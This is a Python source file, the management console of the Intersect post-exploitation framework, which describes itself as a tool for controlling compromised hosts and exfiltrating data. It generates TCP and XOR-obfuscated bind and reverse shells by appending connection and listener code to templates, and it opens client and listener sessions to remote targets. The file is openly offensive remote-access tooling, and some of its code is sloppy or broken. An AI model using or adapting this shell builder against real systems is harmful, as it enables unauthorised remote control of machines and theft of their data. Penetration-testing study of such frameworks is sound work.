#!/usr/bin/python
# Intersect Framework (c) 2012
# Framework interaction utility
# https://ohdae.github.com/Intersect-2.5/

import os, sys, re
from src import core
from src import shells
import string
import signal
import shutil

# Aliases for directory locations
Scripts = core.Scripts            # location for generated Intersect shells
Payloads = core.Payloads          # location for generated payloads
ModulesDir = core.ModulesDir      # contains all the modules
ShellTmp = core.ShellTemps        # contains templates for Intersect shells
PayloadTmp = core.PayloadTemps    # contains templates for payloads

active_sessions = {}
fw_version = "2.5.4"
tab_complete = True
header = " => "
clients = [ "tcp", "xor" ]
listeners = [ "tcp", "xor" ]

# check if readline is installed. we can't use tab completion without it. :(
try:
    import readline
except ImportError:
    core.warning("Python readline is not installed. Tab completion will be disabled.")
    tab_complete = False
    core.logging.info("Python Readline library not installed. Tab completion is disabled.")

if tab_complete == True:
    readline.parse_and_bind("tab: complete")


def about_dialog():
    print("""\n
                %sIntersect Framework
                  revision %s
              created by bindshell labs%s
    
    Intersect is a post-exploitation framework written in Python.
    The purpose of this framework and the included modules are to
    assist penetration testers in automating and controlling many
    post-exploitation and data exfiltration tasks. There is full
    documentation, guides and license information available in the
    Docs directory.
    
    Using the Management application, you can interact with remote
    targets that are running an Intersect shell, whether they are
    serving a client or listener. You can interact with multiple
    remote targets at once, setup listeners to accept multiple
    connections and execute Intersect modules remotely.
    
    bindshell labs: http://bindshell.it.cx
    project home:   https://ohdae.github.com/Intersect-2.5
    repository:     https://github.com/ohdae/Intersect-2.5\n
    """ % (core.bold, fw_version, core.reset))


# configure tab completion commands and such.
# one day i'll fix this so each aspect of the script pulls from an individual wordlist
class Completer:
    def __init__(self):
        self.words = ["help", "about", "client", "clear", "listener", "files", "exit",
                        "exec", "download", "upload", "mods", "quit", "info", "killme", "build",
                        "addr", "port", "name", "key", "view", "type" ]
        self.prefix = ":"

    def complete(self, prefix, index):
        if prefix != self.prefix:
            self.matching_words = [w for w in self.words if w.startswith(prefix)]
            self.prefix = prefix
        else:
            pass
        try:
            return self.matching_words[index]
            return self.match_mods[index]
        except IndexError:
            return None


# main Intersect console. not much to see here.
class manage(object):
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)

    def main(self):
        print("""
%sIntersect Framework - version %s%s
Type :help for all available commands
\n\n""" % (core.uline, fw_version, core.reset))

        
        while True:

            if tab_complete == True:
                completer = Completer()
                readline.set_completer(completer.complete)
                
            command = raw_input("intersect => ")
        
            if command == (":client"):
                os.system("clear")
                interact.client()
                    
            elif command == (":listener"):
                os.system("clear")
                interact.listener()
                
            elif command == (":handler"):
                os.system("clear")
                interact.handler()
                
            elif command == (":shell"):
                os.system("clear")
                build.server()
                
            elif command == (":payload"):
                os.system("clear")
                build.payload()
                
            elif command == (":logging"):
                os.system("clear")
                options.logs()
                
            elif command == (":globals"):
                os.system("clear")
                options.globals()
                
            elif command == (":storage"):
                os.system("clear")
                options.storage()
                
            elif command == (":help"):
                print("\n\n          %sIntersect%s" % (core.uline, core.reset))
                print("     :about  =>  display the 'about' dialog")
                print("     :clear  =>  clears the screen")
                print("   :modules  =>  view or import modules")
                print("      :help  =>  display this help menu")
                print("      :exit  =>  exit Intersect completely\n")
                print("           %sBuild%s" % (core.uline, core.reset))
                print("     :shell  =>  create server-side Intersect shell")
                print("   :payload  =>  create staged or web-dl payload\n")
                print("           %sInteract%s " % (core.uline, core.reset))
                print("    :client  =>  start standalone client")
                print("  :listener  =>  start standalone listener")
                print("   :handler  =>  setup payload handler & shell\n")
                print("           %sConfigure%s " % (core.uline, core.reset))
                print("   :logging  =>  customize log options")
                print("   :globals  =>  set global variables")
                print("   :storage  =>  change storage directory\n")
                  
            elif command == (":about"):
                about_dialog()
                
            elif command == (":exit"):
                core.warning("Shutting down Intersect!")
                sys.exit(0)
                
            elif command == (":quit"):
                core.warning("Shutting down Intersect!")
                sys.exit(0)
                                        
            elif command == (":clear"):
                os.system("clear")
                
            else:
                core.warning("invalid command!")


# functions for interacting with remote hosts. setup clients, listeners and handlers.
class interact:
    def __init__(self):
        self.HOST = ""
        self.PORT = ""
        self.TYPE = ""
        self.PKEY = ""
        
    def handler(self): # place-holder 
        print("\n%sConfigure handler and shell settings" % core.bold)
        print("Type :help for all commands%s" % core.reset)
        

    def client(self):
        print("\n%sConfigure your client settings" % core.bold)
        print("Type :help for all commands%s" % core.reset)
        
        while True:
            
            option = raw_input("client => ")
            
            if option == (":help"):
                print("\n")
                print("     :type  =>  shell type [tcp, xor]")
                print("   :addr i  =>  remote IP/host")
                print("   :port p  =>  remote port")
                print("    :key k  =>  xor private key")
                print("    :start  =>  start client shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu\n")
                
            elif option.startswith(":type"):
                self.TYPE = core.get_choice(option)
                if self.TYPE in clients:
                    print("type: %s" % self.TYPE)
                else:
                    core.warning("invalid shell type!")
                    
            elif option.startswith(":addr"):
                self.HOST = core.get_choice(option)
                if self.HOST != "" and core.valid_ip(self.HOST):
                    print("ip address: %s" % self.HOST)
                else:
                    core.warning("invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                self.PORT = core.get_choice(option)
                if self.PORT != "" and self.PORT.isdigit():
                    print("port: %s" % self.PORT)
                else:
                    core.warning("invalid port number!")
                
            elif option.startswith(":key"):
                self.PKEY = core.get_choice(option)
                if self.PKEY != "":
                    print("key: %s" % self.PKEY)
                else:
                    core.warning("invalid key!")
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nShell: %s" % self.TYPE)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.PKEY)
                
            elif option.startswith(":start"):
                if core.check_options(self.HOST, self.PORT, self.TYPE, self.PKEY):
                    if self.TYPE == "tcp":
                        shells.tcp.client(self.HOST, self.PORT)
                    elif self.TYPE == "xor":
                        shells.xor.client(self.HOST, self.PORT, self.PKEY)
                    else:
                        core.warning("invalid shell type!")
                    
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                core.inputerr()
                    
                    
    def listener(self):
        print("\n%sConfigure your listener settings%s" % (core.uline, core.reset))
        print("Type :help for all commands")
        
        while True:
            
            option = raw_input("listener => ")
            
            if option == (":help"):
                print("\n")
                print("     :type  =>  shell type [tcp, xor]")
                print("   :addr i  =>  remote IP/host")
                print("   :port p  =>  remote port")
                print("    :key k  =>  xor private key")
                print("    :start  =>  start client shell")
                print("     :view  =>  display current settings")
                print("     :help  =>  view this menu")
                print("    :clear  =>  clears the screen")
                print("     :exit  =>  return to main menu\n")
                
            elif option.startswith(":type"):
                self.TYPE = core.get_choice(option)
                if self.TYPE in clients:
                    print("type: %s" % self.TYPE)
                else:
                    core.warning("invalid type!")
                    
            elif option.startswith(":addr"):
                self.HOST = core.get_choice(option)
                if self.HOST != "" and core.valid_ip(self.HOST):
                    print("ip address: %s" % self.HOST)
                else:
                    core.warning("invalid IPv4 address!")
                    
            elif option.startswith(":port"):
                self.PORT = core.get_choice(option)
                if self.PORT != "" and self.PORT.isdigit():
                    print("port: %s" % self.PORT)
                else:
                    core.warning("invalid port number!")
                
            elif option.startswith(":key"):
                self.PKEY = core.get_choice(option)
                if self.PKEY != "":
                    print("key: %s" % self.PKEY)
                else:
                    core.warning("invalid key!")
                
            elif option == (":exit"):
                manage.main()
                
            elif option == (":quit"):
                manage.main()
                
            elif option == (":view"):
                print("\nShell: %s" % self.TYPE)
                print("Host: %s" % self.HOST)
                print("Port: %s" % self.PORT)
                print("Key: %s\n" % self.PKEY)
                
            elif option.startswith(":start"):
                if core.check_options(self.HOST, self.PORT, self.TYPE, self.PKEY):
                    if self.TYPE == "tcp":
                        shells.tcp.server(self.HOST, self.PORT)
                    elif self.TYPE == "xor":
                        shells.xor.server(self.HOST, self.PORT, self.PKEY)
                    else:
                        core.warning("invalid shell type!")
                    
            elif option == (":clear"):
                os.system("clear")
                    
            else:
                core.inputerr()

# functions to build payloads and Intersect shells
class build:
    def __init__(self):
        self.HOST = ""
        self.PORT = ""
        self.TYPE = ""
        self.NAME = ""
        self.PKEY = ""
        
        
    def payload(self): # place holder
        print("\nConfigure your payload settings")
        

    def server(self):
        print("\n\nBuild Intersect shell")
        print("""
              1 => TCP bind
              2 => TCP reverse
              3 => XOR TCP bind
              4 => XOR TCP reverse
              5 => Return to Main Menu

              """)
              
              
        while True:
            choice = raw_input("build => ")
            
            signal.signal(signal.SIGINT, core.signalHandler)
                  
            if choice == "1":
                template = (ShellTmp+"tcpbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input("tcp-bind => ")
                if os.path.exists(Scripts+name):
                    core.warning("filename all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input("bind IP => ")
                port = raw_input("bind port => ")
                core.status("verifying options...")
                if core.check_options(host, port, 'tcp', ''):
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\nHOST = '%s'" % host)
                    makeshell.write("\nPORT = int(%s)" % port)
                    makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                    makeshell.write("\nconn.bind((HOST, PORT))")
                    makeshell.write("\nconn.listen(5)")
                    makeshell.write("\naccept()")
                    makeshell.close()
                    core.status("new shell created!")
                    core.status("location: %s" % Scripts+name)
                    manage.main()
                else:
                    build.server()
                
                
            elif choice == "2":
                template = (ShellTmp+"tcprev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input("tcp-rev => ")
                if os.path.exists(Scripts+name):
                    core.warning("filename all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input("listen IP => ")
                port = raw_input("listen port => ")
                core.status("verifying options...")
                if core.check_options(host, port, 'tcp', ''):
                    newshell = open(Scripts+name, "a")
                    newshell.write("\nHOST = '%s'" % host)
                    newshell.write("\nPORT = int(%s)" % port)
                    newshell.write("\nmain(HOST, PORT)")
                    newshell.close()
                    core.status("new shell created!")
                    core.status("location: %s" % Scripts+name)
                    manage.main()
                else:
                    build.server()
                                
            elif choice == "3":
                template = (ShellTmp+"xorbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input("xor-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] filename all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input("bind IP => ")
                port = raw_input("bind port => ")
                key = raw_input("xor key => ")
                core.status("verifying options...")
                if core.check_options(host, port, 'xor', key):
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\nHOST = '%s'" % host)
                    makeshell.write("\nPORT = int(%s)" % port)
                    makeshell.write("\npin = '%s'" % key)
                    makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                    makeshell.write("\nconn.bind((HOST, PORT))")
                    makeshell.write("\nconn.listen(5)")
                    makeshell.write("\naccept()")
                    makeshell.close()
                    core.status("new shell created!")
                    core.status("location: %s" % Scripts+name)
                    manage.main()
                else:
                    build.server()
                    
            elif choice == "4":
                template = (ShellTmp+"xorrev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input("xor-rev => ")
                if os.path.exists(Scripts+name):
                    core.warning("filename all ready exists!")
                    build.server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input("listen IP => ")
                port = raw_input("listen port => ")
                key = raw_input("xor key => ")
                core.status("verifying options...")
                if core.check_options(host, port, 'xor', key):
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\nHOST = '%s'" % host)
                    makeshell.write("\nPORT = int(%s)" % port)
                    makeshell.write("\npin = '%s'" % key)
                    makeshell.write("\nmain(HOST, PORT, pin)")
                    makeshell.close()
                    makeshell.close()
                    core.status("new shell created!")
                    core.status("location: %s" % Scripts+name)
                    manage.main()
                else:
                    build.server()
                
            elif choice == "5":
                os.system("clear")
                manage.main()
                
            else:
                core.inputerr()



if __name__=='__main__':
    core.banner()
    manage = manage()
    build = build()
    interact = interact()
    manage.main()

